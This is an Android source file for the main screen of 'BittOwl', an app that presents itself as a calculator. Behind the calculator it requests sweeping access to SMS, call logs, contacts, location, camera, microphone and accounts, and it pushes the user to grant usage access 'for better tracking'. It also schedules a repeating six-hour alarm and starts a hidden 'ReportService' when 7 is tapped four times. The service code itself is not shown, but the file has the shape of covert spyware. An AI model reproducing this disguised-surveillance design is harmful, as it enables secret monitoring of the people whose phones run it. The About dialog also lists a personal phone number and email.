package com.mwendasoft.bittowl;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import android.os.Process;
import android.os.Build;
import java.util.*;
import android.support.v4.content.*;
import android.content.pm.*;
import android.*;
import android.support.v4.app.*;
import android.app.*;
import android.provider.*;
import android.content.*;
import com.google.firebase.*;
import android.util.*;
import com.google.firebase.auth.*;
import android.graphics.*;
import android.view.*;
import android.text.*;
import android.text.style.*;

public class MainActivity extends Activity {

    private TextView txtEquation, txtResult;
    private StringBuilder equation = new StringBuilder();
    private int sevenTapCount = 0;
    private Button btnSeven;
	private boolean isReportServiceRunning = false;
	
	private static final int PERMISSION_REQUEST_CODE = 1001;
	
	// BroadcastReceiver to listen for service stop event
    private BroadcastReceiver reportServiceReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            isReportServiceRunning = false;
            Toast.makeText(context, "Report Service Finished!", Toast.LENGTH_SHORT).show();
        }
    };
	
	// Inflate the menu: This ensures the about menu / icon is shown.
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main_menu, menu);
		return true;
	}
	
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		
		// Setup the 6-hour alarm
        setupAlarm();
		
		///=== ACTION BAR SETTINGS ==>
		// Get ActionBar
		ActionBar actionBar = getActionBar();
		if (actionBar != null) {
			actionBar.setDisplayShowTitleEnabled(false); // Hide default title

			// Create a custom TextView
			TextView titleView = new TextView(this);

			// Use SpannableString to color parts of the text
			SpannableString title = new SpannableString("BittOwl");

			// Color "Bitt" dark yellow
			title.setSpan(new ForegroundColorSpan(Color.parseColor("#2196F3")),
						  0, 4, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);

			// Color "Owl" blue
			title.setSpan(new ForegroundColorSpan(Color.parseColor("#FF9800")),
						  4, 7, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);

			// Apply to TextView
			titleView.setText(title);
			titleView.setTextSize(26); // Bigger font
			titleView.setTypeface(Typeface.DEFAULT_BOLD); // Bold
			titleView.setGravity(Gravity.CENTER_VERTICAL);

			// Set as custom ActionBar view
			actionBar.setDisplayShowCustomEnabled(true);
			actionBar.setCustomView(titleView);
		}
		///=== ACTION BAR SETTINGS END ==>

		// Request runtime permissions and check usage stats
        requestAllPermissions();
        checkUsageStatsPermission();
	
        txtEquation = findViewById(R.id.txtEquation);
        txtResult = findViewById(R.id.txtResult);
        btnSeven = findViewById(R.id.btn7);
		
        // Input listener for buttons that add to equation
        View.OnClickListener inputListener = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Button b = (Button) v;
                String input = b.getText().toString();

                // Secret: tap 7 four times
                if (input.equals("7")) {
                    sevenTapCount++;
                    if (sevenTapCount == 4) {
                        triggerSecret();
                        return;
                    }
                } else {
                    sevenTapCount = 0;
                }

                // Map button text to proper expression strings
                if (input.equals("x²")) {
                    equation.append("^2");
                } else if (input.equals("x³")) {
                    equation.append("^3");
                } else if (input.equals("√")) {
                    equation.append("sqrt(");
                } else if (input.equals("×")) {
                    equation.append("*");
                } else if (input.equals("÷")) {
                    equation.append("/");
                } else if (input.equals("ln")) {
                    equation.append("ln(");
                } else if (input.equals("log")) {
                    equation.append("log(");
                } else if (input.equals("sin") || input.equals("cos") || input.equals("tan")) {
                    equation.append(input + "(");
                } else if (input.equals("%")) {
                    equation.append("%");
                } else if (input.equals(".")) {
                    equation.append(".");
				} else {
                    equation.append(input);
                }

                txtEquation.setText(equation.toString());
            }
        };

        // All buttons that add to input
        int[] inputButtons = {
			R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
			R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
			R.id.btnPlus, R.id.btnMinus, R.id.btnMultiply, R.id.btnDivide, R.id.btnPow,
			R.id.btnSin, R.id.btnCos, R.id.btnTan,
			R.id.btnSqrt, R.id.btnLog, R.id.btnLn,
			R.id.btnPercent, R.id.btnPoint,
			R.id.btnOpenParen, R.id.btnCloseParen,
			R.id.btnSquare, R.id.btnCube
        };

        for (int id : inputButtons) {
            findViewById(id).setOnClickListener(inputListener);
        }

        // Clear button
        findViewById(R.id.btnClear).setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					clearCalculator();
				}
			});

        // Equal button
        findViewById(R.id.btnEqual).setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					calculateResult();
				}
			});
	}
	
	private void setupAlarm() {
        Intent alarmIntent = new Intent(this, AlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
            this, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        // 6 hours in milliseconds = 6 * 60 * 60 * 1000 = 21600000
        long interval = 21600000;
        long startTime = System.currentTimeMillis() + 60000; // Start after 1 minute

        if (alarmManager != null) {
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                startTime,
                interval,
                pendingIntent
            );
        }
    }

    private void clearCalculator() {
        equation.setLength(0);
        txtEquation.setText("0");
        txtResult.setText("= 0");
        sevenTapCount = 0;
    }

    private void calculateResult() {
        try {
            String expr = equation.toString();

            // Evaluate using ExpressionEvaluator
            double result = new ExpressionEvaluator().evaluate(expr);

            txtResult.setText("= " + result);

        } catch (Exception e) {
            txtResult.setText("Error");
        }
    }

    private void triggerSecret() {
		if (isReportServiceRunning) {
			// Service is already running, do nothing
			Toast.makeText(this, "Wait... Report still running!", Toast.LENGTH_SHORT).show();
			return;
		}

		btnSeven.setEnabled(false);
		clearCalculator();
		Toast.makeText(this, "Secret triggered!", Toast.LENGTH_SHORT).show();

		isReportServiceRunning = true; // Mark service as running
		startService(new Intent(this, ReportService.class));

		// Re-enable btnSeven after 10 seconds (but still wait for service to finish)
		btnSeven.postDelayed(new Runnable() {
				@Override
				public void run() {
					btnSeven.setEnabled(true);
					sevenTapCount = 0;
				}
			}, 10000);
			
		// Register broadcast receiver to listen for service finish
        registerReceiver(reportServiceReceiver, new IntentFilter("REPORT_SERVICE_FINISHED"));
	}
	
	private void requestAllPermissions() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			List<String> permissionsNeeded = new ArrayList<String>();

			// Storage
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
			}

			// Camera
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.CAMERA);
			}

			// Microphone / Audio
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
			}

			// Communication
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.READ_SMS);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
			}

			// Location
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
			}

			// Network
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_WIFI_STATE)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.ACCESS_WIFI_STATE);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.CHANGE_WIFI_STATE)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.CHANGE_WIFI_STATE);
			}

			// Bluetooth
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.BLUETOOTH);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_ADMIN)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.BLUETOOTH_ADMIN);
			}

			// Calendar
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.READ_CALENDAR);
			}
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CALENDAR)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.WRITE_CALENDAR);
			}

			// Accounts
			if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
                != PackageManager.PERMISSION_GRANTED) {
				permissionsNeeded.add(Manifest.permission.GET_ACCOUNTS);
			}

			// Request all at once if needed
			if (!permissionsNeeded.isEmpty()) {
				ActivityCompat.requestPermissions(this,
												  permissionsNeeded.toArray(new String[permissionsNeeded.size()]),
												  PERMISSION_REQUEST_CODE);
			}
		}
	}
	
	private void checkUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                                         Process.myUid(), getPackageName());

        if (mode != AppOpsManager.MODE_ALLOWED) {
            Toast.makeText(this, "Please allow usage access for better tracking.", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            startActivity(intent);
        }
    }

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		if (item.getItemId() == R.id.action_about) {

			// Nice professional dialog
			AlertDialog.Builder builder = new AlertDialog.Builder(this);

			builder.setTitle("About BittOwl");
			builder.setIcon(R.drawable.ic_about); // About icon in drawable

			builder.setMessage("BittOwl Calculator\n"
							   + "Simple and precise — designed to make your daily calculations easier and more enjoyable.\n\n"
							   + "Creator: Mwenda E. Njagi\n"
							   + "Phone: +254 702 623 729\n"
							   + "Email: erickmwenda256@gmail.com\n"
							   + "Website: MwendaSoft.com");

			builder.setPositiveButton("OK", null);

			AlertDialog dialog = builder.create();
			dialog.show();

			// Make title text bold and centered
			TextView titleView = dialog.findViewById(
                this.getResources().getIdentifier("alertTitle", "id", "android"));
			if (titleView != null) {
				titleView.setGravity(Gravity.LEFT);
				titleView.setTextColor(Color.parseColor("#FFD700")); // Dark Yellow title
				titleView.setTypeface(Typeface.DEFAULT_BOLD);
			}

			// Make message text more readable
			TextView messageView = dialog.findViewById(android.R.id.message);
			if (messageView != null) {
				messageView.setTextSize(16);
				messageView.setLineSpacing(1.3f, 1.3f);
			}

			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
